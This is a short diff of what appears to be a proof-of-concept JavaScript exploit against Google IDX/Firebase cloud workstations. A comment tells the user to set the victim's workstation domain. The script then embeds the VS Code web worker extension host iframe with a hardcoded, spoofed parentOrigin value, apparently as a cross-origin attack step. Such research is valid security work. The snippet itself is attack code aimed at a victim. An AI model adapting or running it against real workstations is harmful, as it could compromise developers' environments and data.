@@ -1,7 +1,7 @@
 // Change this value to the victim's IDX workstation domain
 var victim_idx_workstation_domain = 'firebase-test-xss-1755971113686.cluster-64pjnskmlbaxowh5lzq6i7v4ra.cloudworkstations.dev'
 
-parentOrigin = parent.window.location.origin
+parentOrigin = "https://0376ie8e4dg3t412o7dphhnerrr6uika694jkch3vsaijcp8ck5p.cloudworkstations.googleusercontent.com"
 
 ifr = document.createElement('iframe')
 ifr.src = "https://"+victim_idx_workstation_domain+"/cde-c03b0d878c4bfc82293ab90104c97849f0b2631e/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?parentOrigin="+parentOrigin
